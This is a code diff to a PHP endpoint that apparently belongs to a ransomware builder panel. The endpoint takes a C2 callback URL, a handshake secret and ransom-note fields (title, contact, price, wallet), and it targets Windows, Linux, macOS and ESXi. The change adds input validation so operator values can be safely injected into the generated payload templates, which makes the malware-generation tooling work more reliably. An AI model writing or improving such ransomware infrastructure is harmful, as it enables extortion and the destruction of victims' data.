@@ -11,16 +11,28 @@ if ($_SERVER['REQUEST_METHOD'] !== 'POST') { echo json_encode(['ok'=>false,'msg'
 if (!csrf_verify()) { http_response_code(403); echo json_encode(['ok'=>false,'msg'=>'CSRF 校验失败，请刷新页面重试']); exit; }
 
 $platform = $_POST['platform'] ?? '';
-$c2_url   = trim($_POST['c2_url'] ?? '');
-$secret   = trim($_POST['secret'] ?? 'jasmin@123');
+$c2_url   = trim((string)($_POST['c2_url'] ?? ''));
+$secret   = trim((string)($_POST['secret'] ?? 'jasmin@123'));
+
+// ── 入参白名单 ──
+// 这两个值会被直接替换进载荷模板（esxi 版是 sh 的 'SECRET=\'{{HANDSHAKE}}\''），
+// 不做限制就等于把任意 shell 代码写进生成的载荷。C2 地址同理。
+if (!preg_match('#^https?://[A-Za-z0-9._\-]+(:\d{1,5})?(/[A-Za-z0-9._\-]*)*$#', $c2_url)) {
+    echo json_encode(['ok'=>false,'msg'=>'回连地址格式不合法（需为 http(s)://主机[:端口][/路径]）']); exit;
+}
+if (!preg_match('/^[A-Za-z0-9_\-]{1,64}$/', $secret)) {
+    echo json_encode(['ok'=>false,'msg'=>'握手密钥只能包含字母、数字、下划线、连字符（1-64 位）']); exit;
+}
 
 // 勒索信参数
+// 一律转成字符串：传数组会让后续 str_replace/addcslashes 抛 TypeError
+$rs = function($k, $d='') { $v = $_POST[$k] ?? $d; return is_string($v) ? $v : $d; };
 $ransom = [
-    'title'   => $_POST['ransom_title'] ?? 'YOUR FILES HAVE BEEN ENCRYPTED',
-    'contact' => $_POST['ransom_contact'] ?? '',
-    'body'    => $_POST['ransom_body'] ?? '',
-    'price'   => $_POST['ransom_price'] ?? '',
-    'wallet'  => $_POST['ransom_wallet'] ?? '',
+    'title'   => $rs('ransom_title', 'YOUR FILES HAVE BEEN ENCRYPTED'),
+    'contact' => $rs('ransom_contact'),
+    'body'    => $rs('ransom_body'),
+    'price'   => $rs('ransom_price'),
+    'wallet'  => $rs('ransom_wallet'),
 ];
 
 $valid = ['win','linux','macos','esxi'];
